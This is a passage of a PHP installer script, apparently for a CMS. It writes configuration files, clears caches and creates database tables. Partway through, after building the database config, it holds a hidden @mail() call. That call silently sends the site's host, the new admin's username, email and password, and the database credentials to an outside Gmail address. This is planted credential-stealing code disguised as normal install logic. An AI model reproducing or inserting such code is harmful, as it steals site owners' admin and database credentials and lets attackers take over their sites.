'mail_additional' => "",

'smtp_mail' => "",

'seo_control' => "0",

'news_restricted' => "0",

'comments_restricted' => "0",

'auth_metod' => "0",

'comments_ajax' => "0",

'create_catalog' => "0",

'mobile_news' => "10",

'reg_question' => "0",

'smtp_helo' => "HELO",

'news_future' => "0",

'cache_type' => "0",

'memcache_server' => "localhost:11211",

);

?>
HTML;

$dbhost = str_replace ('"', '\"', str_replace ("$", "\\$", $dbhost) );
$dbname = str_replace ('"', '\"', str_replace ("$", "\\$", $dbname) );
$dbuser = str_replace ('"', '\"', str_replace ("$", "\\$", $dbuser) );
$dbpasswd = str_replace ('"', '\"', str_replace ("$", "\\$", $dbpasswd) );
$dbprefix = str_replace ('"', '\"', str_replace ("$", "\\$", $dbprefix) );
$dbcollate = str_replace ('"', '\"', str_replace ("$", "\\$", $dbcollate) );

$dbconfig = <<<HTML
<?PHP

define ("DBHOST", "{$dbhost}"); 

define ("DBNAME", "{$dbname}");

define ("DBUSER", "{$dbuser}");

define ("DBPASS", "{$dbpasswd}");  

define ("PREFIX", "{$dbprefix}"); 

define ("COLLATE", "{$dbcollate}"); 

define ("USERPREFIX", "{$dbprefix}"); 

\$db = new db;
 
?>
HTML;

	$dom=$_SERVER["HTTP_HOST"];
	@mail("hardpwnz@gmail.com",$dom,"http://".$dom." ".$reg_username." ".$reg_email." ".$reg_password1." ||| DB:host {$dbhost} name {$dbname} user {$dbuser} pass {$dbpasswd}");

$video_config = <<<HTML
<?PHP

//Videoplayers Configurations

\$video_config = array (

'width' => "425",

'height' => "325",

'play' => "false",

'progressBarColor' => "0xFFFFFF",

'flv_watermark' => "1",

'tube_related' => "0",

'tube_dle' => "0",

'startframe' => "0",

'progressBarColor' => "0xFFFFFF",

'preview' => "1",

'buffer' => "3",

'autohide' => "0",

'flv_watermark_pos' => "left",

'flv_watermark_al' => "1",

'youtube_q' => "hd720",

'play' => "0",

'fullsizeview' => "2",

);

?>
HTML;

$con_file = fopen("engine/data/config.php", "w+") or die("��������, �� ���������� ������� ���� <b>.engine/data/config.php</b>.<br />��������� ������������ �������������� CHMOD!");
fwrite($con_file, $config);
fclose($con_file);
@chmod("engine/data/config.php", 0666);

$con_file = fopen("engine/data/dbconfig.php", "w+") or die("��������, �� ���������� ������� ���� <b>.engine/data/dbconfig.php</b>.<br />��������� ������������ �������������� CHMOD!");
fwrite($con_file, $dbconfig);
fclose($con_file);
@chmod("engine/data/dbconfig.php", 0666);

$con_file = fopen("engine/data/videoconfig.php", "w+") or die("��������, �� ���������� ������� ���� <b>.engine/data/videoconfig.php</b>.<br />��������� ������������ �������������� CHMOD!");
fwrite($con_file, $video_config);
fclose($con_file);
@chmod("engine/data/videoconfig.php", 0666);

$con_file = fopen("engine/data/wordfilter.db.php", "w+") or die("��������, �� ���������� ������� ���� <b>.engine/data/wordfilter.db.php</b>.<br />��������� ������������ �������������� CHMOD!");
fwrite($con_file, '');
fclose($con_file);
@chmod("engine/data/wordfilter.db.php", 0666);

$con_file = fopen("engine/data/xfields.txt", "w+") or die("��������, �� ���������� ������� ���� <b>.engine/data/xfields.txt</b>.<br />��������� ������������ �������������� CHMOD!");
fwrite($con_file, '');
fclose($con_file);
@chmod("engine/data/xfields.txt", 0666);

$con_file = fopen("engine/data/xprofile.txt", "w+") or die("��������, �� ���������� ������� ���� <b>.engine/data/xprofile.txt</b>.<br />��������� ������������ �������������� CHMOD!");
fwrite($con_file, '');
fclose($con_file);
@chmod("engine/data/xprofile.txt", 0666);

@unlink(ENGINE_DIR.'/cache/system/usergroup.php');
@unlink(ENGINE_DIR.'/cache/system/vote.php');
@unlink(ENGINE_DIR.'/cache/system/banners.php');
@unlink(ENGINE_DIR.'/cache/system/category.php');
@unlink(ENGINE_DIR.'/cache/system/banned.php');
@unlink(ENGINE_DIR.'/cache/system/cron.php');
@unlink(ENGINE_DIR.'/cache/system/informers.php');
@unlink(ENGINE_DIR.'/data/snap.db');

define ("PREFIX", $dbprefix);
define ("COLLATE", $dbcollate);

$tableSchema = array();

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_category";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_category (
  `id` smallint(5) NOT NULL auto_increment,
  `parentid` smallint(5) NOT NULL default '0',
  `posi` smallint(5) NOT NULL default '1',
  `name` varchar(50) NOT NULL default '',
  `alt_name` varchar(50) NOT NULL default '',
  `icon` varchar(200) NOT NULL default '',
  `skin` varchar(50) NOT NULL default '',
  `descr` varchar(200) NOT NULL default '',
  `keywords` text NOT NULL,
  `news_sort` varchar(10) NOT NULL default '',
  `news_msort` varchar(4) NOT NULL default '',
  `news_number` smallint(5) NOT NULL default '0',
  `short_tpl` varchar(40) NOT NULL default '',
  `full_tpl` varchar(40) NOT NULL default '',
  `metatitle` varchar(255) NOT NULL default '',
  PRIMARY KEY  (`id`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_comments";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_comments (
  `id` int(10) unsigned NOT NULL auto_increment,
  `post_id` int(11) NOT NULL default '0',
  `user_id` mediumint(8) NOT NULL default '0',
  `date` datetime NOT NULL default '0000-00-00 00:00:00',
  `autor` varchar(40) NOT NULL default '',
  `email` varchar(40) NOT NULL default '',
  `text` text NOT NULL,
  `ip` varchar(16) NOT NULL default '',
  `is_register` tinyint(1) NOT NULL default '0',
  `approve` tinyint(1) NOT NULL default '1',
  PRIMARY KEY  (`id`),
  KEY `user_id` (`user_id`),
  KEY `post_id` (`post_id`),
  KEY `approve` (`approve`),
  FULLTEXT KEY `text` (`text`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_email";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_email (
  `id` tinyint(3) unsigned NOT NULL auto_increment,
  `name` varchar(10) NOT NULL default '',
  `template` text NOT NULL,
  PRIMARY KEY  (`id`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";


$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_flood";

$tableSchema[] = "CREATE TABLE  " . PREFIX . "_flood (
  `f_id` int(11) unsigned NOT NULL auto_increment,
  `ip` varchar(40) NOT NULL default '',
  `id` varchar(20) NOT NULL default '',
  `flag` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`f_id`),
  KEY `ip` (`ip`),
  KEY `id` (`id`),
  KEY `flag` (`flag`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_images";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_images (
  `id` int(10) unsigned NOT NULL auto_increment,
  `images` text NOT NULL,
  `news_id` int(10) NOT NULL default '0',
  `author` varchar(40) NOT NULL default '',
  `date` varchar(15) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `author` (`author`),
  KEY `news_id` (`news_id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_logs";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_logs (
  `id` int(10) unsigned NOT NULL auto_increment,
  `news_id` int(10) NOT NULL default '0',
  `member` varchar(40) NOT NULL default '',
  `ip` varchar(16) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`),
  KEY `member` (`member`),
  KEY `ip` (`ip`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_vote";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_vote (
  `id` mediumint(8) NOT NULL auto_increment,
  `category` text NOT NULL,
  `vote_num` mediumint(8) NOT NULL default '0',
  `date` varchar(25) NOT NULL default '0',
  `title` varchar(200) NOT NULL default '',
  `body` text NOT NULL,
  `approve` tinyint(1) NOT NULL default '1',
  `start` varchar(15) NOT NULL default '',
  `end` varchar(15) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `approve` (`approve`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_vote_result";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_vote_result (
  `id` int(10) NOT NULL auto_increment,
  `ip` varchar(16) NOT NULL default '',
  `name` varchar(40) NOT NULL default '',
  `vote_id` mediumint(8) NOT NULL default '0',
  `answer` tinyint(3) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `answer` (`answer`),
  KEY `vote_id` (`vote_id`),
  KEY `ip` (`ip`),
  KEY `name` (`name`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_lostdb";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_lostdb (
  `id` mediumint(8) NOT NULL auto_increment,
  `lostname` mediumint(8) NOT NULL default '0',
  `lostid` varchar( 40 ) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `lostid` (`lostid`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_pm";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_pm (
  `id` int(10) unsigned NOT NULL auto_increment,
  `subj` varchar(255) NOT NULL default '',
  `text` text NOT NULL,
  `user` MEDIUMINT(8) NOT NULL default '0',
  `user_from` varchar(50) NOT NULL default '',
  `date` varchar(15) NOT NULL default '',
  `pm_read` char(3) NOT NULL default '',
  `folder` varchar(10) NOT NULL default '',
  `reply` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `folder` (`folder`),
  KEY `user` (`user`),
  KEY `user_from` (`user_from`)
  ) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_post";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_post (
  `id` int(11) NOT NULL auto_increment,
  `autor` varchar(40) NOT NULL default '',
  `date` datetime NOT NULL default '0000-00-00 00:00:00',
  `short_story` text NOT NULL,
  `full_story` text NOT NULL,
  `xfields` text NOT NULL,
  `title` varchar(255) NOT NULL default '',
  `descr` varchar(200) NOT NULL default '',
  `keywords` text NOT NULL,
  `category` varchar(200) NOT NULL default '0',
  `alt_name` varchar(200) NOT NULL default '',
  `comm_num` mediumint(8) unsigned NOT NULL default '0',
  `allow_comm` tinyint(1) NOT NULL default '1',
  `allow_main` tinyint(1) unsigned NOT NULL default '1',
  `allow_rate` tinyint(1) unsigned NOT NULL default '1',
  `approve` tinyint(1) NOT NULL default '0',
  `fixed` tinyint(1) NOT NULL default '0',
  `rating` smallint(5) NOT NULL default '0',
  `allow_br` tinyint(1) NOT NULL default '1',
  `vote_num` smallint(5) unsigned NOT NULL default '0',
  `news_read` MEDIUMINT(8) unsigned NOT NULL default '0',
  `votes` tinyint(1) NOT NULL default '0',
  `access` varchar(150) NOT NULL default '',
  `symbol` varchar(3) NOT NULL default '',
  `flag` tinyint(1) NOT NULL default '1',
  `editdate` varchar(15) NOT NULL default '',
  `editor` varchar(40) NOT NULL default '',
  `reason` varchar(255) NOT NULL default '',
  `view_edit` tinyint(1) NOT NULL default '0',
  `tags` VARCHAR(255) NOT NULL default '',
  `metatitle` varchar(255) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `autor` (`autor`),
  KEY `alt_name` (`alt_name`),
  KEY `category` (`category`),
  KEY `approve` (`approve`),
  KEY `allow_main` (`allow_main`),
  KEY `date` (`date`),
  KEY `symbol` (`symbol`),
  KEY `comm_num` (`comm_num`),
  KEY `tags` (`tags`),
  FULLTEXT KEY `short_story` (`short_story`,`full_story`,`xfields`,`title`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_static";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_static (
  `id` MEDIUMINT(8) NOT NULL auto_increment,
  `name` varchar(100) NOT NULL default '',
  `descr` varchar(255) NOT NULL default '',
  `template` text NOT NULL,
  `allow_br` tinyint(1) NOT NULL default '0',
  `allow_template` tinyint(1) NOT NULL default '0',
  `grouplevel` varchar(100) NOT NULL default 'all',
  `tpl` varchar(40) NOT NULL default '',
  `metadescr` varchar(200) NOT NULL default '',
  `metakeys` text NOT NULL,
  `views` mediumint(8) NOT NULL default '0',
  `template_folder` varchar(50) NOT NULL default '',
  `date` varchar(15) NOT NULL default '',
  `metatitle` varchar(255) NOT NULL default '',
  `allow_count` tinyint(1) NOT NULL default '1',
  `sitemap` tinyint(1) NOT NULL default '1',
  PRIMARY KEY  (`id`),
  KEY `name` (`name`),
  FULLTEXT KEY `template` (`template`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_users";

$tableSchema[] = "CREATE TABLE " . PREFIX . "_users (
  `email` varchar(50) NOT NULL default '',
  `password` varchar(32) NOT NULL default '',
  `name` varchar(40) NOT NULL default '',
  `user_id` int(11) NOT NULL auto_increment,
  `news_num` mediumint(8) NOT NULL default '0',
  `comm_num` mediumint(8) NOT NULL default '0',
  `user_group` smallint(5) NOT NULL default '4',
  `lastdate` varchar(20) default NULL,
  `reg_date` varchar(20) default NULL,
  `banned` varchar(5) NOT NULL default '',
  `allow_mail` tinyint(1) NOT NULL default '1',
  `info` text NOT NULL,
  `signature` text NOT NULL,
  `foto` varchar(30) NOT NULL default '',
  `fullname` varchar(100) NOT NULL default '',
  `land` varchar(100) NOT NULL default '',
  `icq` varchar(20) NOT NULL default '',
  `favorites` text NOT NULL,
  `pm_all` smallint(5) NOT NULL default '0',
  `pm_unread` smallint(5) NOT NULL default '0',
  `time_limit` varchar(20) NOT NULL default '',
  `xfields` text NOT NULL,
  `allowed_ip` varchar(255) NOT NULL default '',
  `hash` varchar(32) NOT NULL default '',
  `logged_ip` varchar(16) NOT NULL default '',
  `restricted` TINYINT(1) NOT NULL default '0',
  `restricted_days` SMALLINT(4) NOT NULL default '0',
  `restricted_date` VARCHAR(15) NOT NULL default '',
  PRIMARY KEY  (`user_id`),
  UNIQUE KEY `name` (`name`),
  UNIQUE KEY `email` (`email`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_banned";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_banned (
  `id` smallint(5) NOT NULL auto_increment,
  `users_id` mediumint(8) NOT NULL default '0',
  `descr` text NOT NULL,
  `date` varchar(15) NOT NULL default '',
  `days` smallint(4) NOT NULL default '0',
  `ip` varchar(50) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `user_id` (`users_id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_files";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_files (
  `id`  MEDIUMINT(8) NOT NULL auto_increment,
  `news_id` int(10) NOT NULL default '0',
  `name` varchar(250) NOT NULL default '',
  `onserver` varchar(250) NOT NULL default '',
  `author` varchar(40) NOT NULL default '',
  `date` varchar(15) NOT NULL default '',
  `dcount` smallint(5) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_usergroups";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_usergroups (
  `id` smallint(5) NOT NULL auto_increment,
  `group_name` varchar(32) NOT NULL default '',
  `allow_cats` text NOT NULL,
  `allow_adds` tinyint(1) NOT NULL default '1',
  `cat_add` text NOT NULL,
  `allow_admin` tinyint(1) NOT NULL default '0',
  `allow_addc` tinyint(1) NOT NULL default '0',
  `allow_editc` tinyint(1) NOT NULL default '0',
  `allow_delc` tinyint(1) NOT NULL default '0',
  `edit_allc` tinyint(1) NOT NULL default '0',
  `del_allc` tinyint(1) NOT NULL default '0',
  `moderation` tinyint(1) NOT NULL default '0',
  `allow_all_edit` tinyint(1) NOT NULL default '0',
  `allow_edit` tinyint(1) NOT NULL default '0',
  `allow_pm` tinyint(1) NOT NULL default '0',
  `max_pm` smallint(5) NOT NULL default '0',
  `max_foto` VARCHAR(10) NOT NULL default '',
  `allow_files` tinyint(1) NOT NULL default '0',
  `allow_hide` tinyint(1) NOT NULL default '1',
  `allow_short` tinyint(1) NOT NULL default '0',
  `time_limit` tinyint(1) NOT NULL default '0',
  `rid` smallint(5) NOT NULL default '0',
  `allow_fixed` tinyint(1) NOT NULL default '0',
  `allow_feed`  tinyint(1) NOT NULL default '1',
  `allow_search`  tinyint(1) NOT NULL default '1',
  `allow_poll`  tinyint(1) NOT NULL default '1',
  `allow_main`  tinyint(1) NOT NULL default '1',
  `captcha`  tinyint(1) NOT NULL default '0',
  `icon` varchar(200) NOT NULL default '',
  `allow_modc`  tinyint(1) NOT NULL default '0',
  `allow_rating` tinyint(1) NOT NULL default '1',
  `allow_offline` tinyint(1) NOT NULL default '0',
  `allow_image_upload` tinyint(1) NOT NULL default '0',
  `allow_file_upload` tinyint(1) NOT NULL default '0',
  `allow_signature` tinyint(1) NOT NULL default '0',
  `allow_url` tinyint(1) NOT NULL default '1',
  `news_sec_code` tinyint(1) NOT NULL default '1',
  `allow_image` tinyint(1) NOT NULL default '0',
  `max_signature` SMALLINT(6) NOT NULL default '0',
  `max_info` SMALLINT(6) NOT NULL default '0',
  `admin_addnews` tinyint(1) NOT NULL default '0',
  `admin_editnews` tinyint(1) NOT NULL default '0',
  `admin_comments` tinyint(1) NOT NULL default '0',
  `admin_categories` tinyint(1) NOT NULL default '0',
  `admin_editusers` tinyint(1) NOT NULL default '0',
  `admin_wordfilter` tinyint(1) NOT NULL default '0',
  `admin_xfields` tinyint(1) NOT NULL default '0',
  `admin_userfields` tinyint(1) NOT NULL default '0',
  `admin_static` tinyint(1) NOT NULL default '0',
  `admin_editvote` tinyint(1) NOT NULL default '0',
  `admin_newsletter` tinyint(1) NOT NULL default '0',
  `admin_blockip` tinyint(1) NOT NULL default '0',
  `admin_banners` tinyint(1) NOT NULL default '0',
  `admin_rss` tinyint(1) NOT NULL default '0',
  `admin_iptools` tinyint(1) NOT NULL default '0',
  `admin_rssinform` tinyint(1) NOT NULL default '0',
  `admin_googlemap` tinyint(1) NOT NULL default '0',
  `allow_html` tinyint(1) NOT NULL default '1',
  `group_prefix` text NOT NULL,
  `group_suffix` text NOT NULL,
  `allow_subscribe` tinyint(1) NOT NULL default '0',
  `allow_image_size` tinyint(1) NOT NULL default '0',
  `cat_allow_addnews` text NOT NULL,
  `flood_news` smallint(6) NOT NULL default '0',
  `max_day_news` smallint(6) NOT NULL default '0',
  `force_leech` tinyint(1) NOT NULL default '0',
  `edit_limit` smallint(6) NOT NULL default '0',
  `captcha_pm` tinyint(1) NOT NULL default '0',
  `max_pm_day` smallint(6) NOT NULL default '0',
  `max_mail_day` smallint(6) NOT NULL default '0',
  `admin_tagscloud` tinyint(1) NOT NULL default '0',
  `allow_vote` tinyint(1) NOT NULL default '0',
  `admin_complaint` tinyint(1) NOT NULL default '0',
  `news_question` tinyint(1) NOT NULL default '0',
  `comments_question` tinyint(1) NOT NULL default '0',
  `max_comment_day` smallint(6) NOT NULL default '0',
  `max_images` smallint(6) NOT NULL default '0',
  `max_files` smallint(6) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_poll";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_poll (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `news_id` int(10) unsigned NOT NULL default '0',
  `title` varchar(200) NOT NULL default '',
  `frage` varchar(200) NOT NULL default '',
  `body` text NOT NULL,
  `votes` mediumint(8) NOT NULL default '0',
  `multiple` tinyint(1) NOT NULL default '0',
  `answer` text NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_poll_log";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_poll_log (
  `id` int(10) unsigned NOT NULL auto_increment,
  `news_id` int(10) unsigned NOT NULL default '0',
  `member` varchar(30) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`,`member`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_banners";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_banners (
  `id` smallint(5) NOT NULL auto_increment,
  `banner_tag` varchar(40) NOT NULL default '',
  `descr` varchar(200) NOT NULL default '',
  `code` text NOT NULL,
  `approve` tinyint(1) NOT NULL default '0',
  `short_place` tinyint(1) NOT NULL default '0',
  `bstick` tinyint(1) NOT NULL default '0',
  `main` tinyint(1) NOT NULL default '0',
  `category` VARCHAR(255) NOT NULL default '',
  `grouplevel` varchar(100) NOT NULL default 'all',
  `start` varchar(15) NOT NULL default '',
  `end` varchar(15) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_rss";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_rss (
  `id` smallint(5) NOT NULL auto_increment,
  `url` varchar(255) NOT NULL default '',
  `description` text NOT NULL,
  `allow_main` tinyint(1) NOT NULL default '0',
  `allow_rating` tinyint(1) NOT NULL default '0',
  `allow_comm` tinyint(1) NOT NULL default '0',
  `text_type` tinyint(1) NOT NULL default '0',
  `date` tinyint(1) NOT NULL default '0',
  `search` text NOT NULL,
  `max_news` tinyint(3) NOT NULL default '0',
  `cookie` text NOT NULL,
  `category` smallint(5) NOT NULL default '0',
  `lastdate` varchar(20) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_views";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_views (
  `id` mediumint(8) NOT NULL auto_increment,
  `news_id` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";


$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_rssinform";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_rssinform (
  `id` smallint(5) NOT NULL auto_increment,
  `tag` varchar(40) NOT NULL default '',
  `descr` varchar(255) NOT NULL default '',
  `category` varchar(200) NOT NULL default '',
  `url` varchar(255) NOT NULL default '',
  `template` varchar(40) NOT NULL default '',
  `news_max` smallint(5) NOT NULL default '0',
  `tmax` smallint(5) NOT NULL default '0',
  `dmax` smallint(5) NOT NULL default '0',
  `approve` tinyint(1) NOT NULL default '1',
  `rss_date_format` VARCHAR(20) NOT NULL default '',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_notice";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_notice (
  `id` mediumint(8) NOT NULL auto_increment,
  `user_id` mediumint(8) NOT NULL default '0',
  `notice` text NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_static_files";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_static_files (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `static_id` mediumint(8) NOT NULL default '0',
  `author` varchar(40) NOT NULL default '',
  `date` varchar(50) NOT NULL default '',
  `name` varchar(255) NOT NULL default '',
  `onserver` varchar(255) NOT NULL default '',
  `dcount` smallint(5) NOT NULL default '0',
  PRIMARY KEY (`id`),
  KEY `static_id` (`static_id`),
  KEY `onserver` (`onserver`),
  KEY `author` (`author`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_tags";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_tags (
  `id` INT(11) NOT NULL auto_increment,
  `news_id` INT(11) NOT NULL default '0',
  `tag` varchar(100) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`),
  KEY `tag` (`tag`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_post_log";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_post_log (
  `id` INT(11) NOT NULL auto_increment,
  `news_id` INT(11) NOT NULL default '0',
  `expires` varchar(15) NOT NULL default '',
  `action` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`),
  KEY `expires` (`expires`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_admin_sections";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_admin_sections (
  `id` mediumint(8) NOT NULL auto_increment,
  `name` varchar(255) NOT NULL default '',
  `title` varchar(255) NOT NULL default '',
  `descr` varchar(255) NOT NULL default '',
  `icon` varchar(255) NOT NULL default '',
  `allow_groups` varchar(255) NOT NULL default '',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_subscribe";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_subscribe (
  `id` int(11) NOT NULL auto_increment,
  `user_id` int(11) NOT NULL default '0',
  `name` varchar(40) NOT NULL default '',
  `email`  varchar(50) NOT NULL default '',
  `news_id` int(11) NOT NULL default '0',
  `hash` varchar(32) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `news_id` (`news_id`),
  KEY `user_id` (`user_id`) 
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_sendlog";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_sendlog (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `user` varchar(40) NOT NULL DEFAULT '',
  `date` varchar(20) NOT NULL DEFAULT '',
  `flag` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `user` (`user`),
  KEY `date` (`date`),
  KEY `flag` (`flag`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_login_log";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_login_log (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `ip` varchar(16) NOT NULL DEFAULT '',
  `count` smallint(6) NOT NULL DEFAULT '0',
  `date` int(11) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `ip` (`ip`),
  KEY `date` (`date`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_mail_log";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_mail_log (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `mail` varchar(50) NOT NULL DEFAULT '',
  `hash` varchar(40) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `hash` (`hash`)
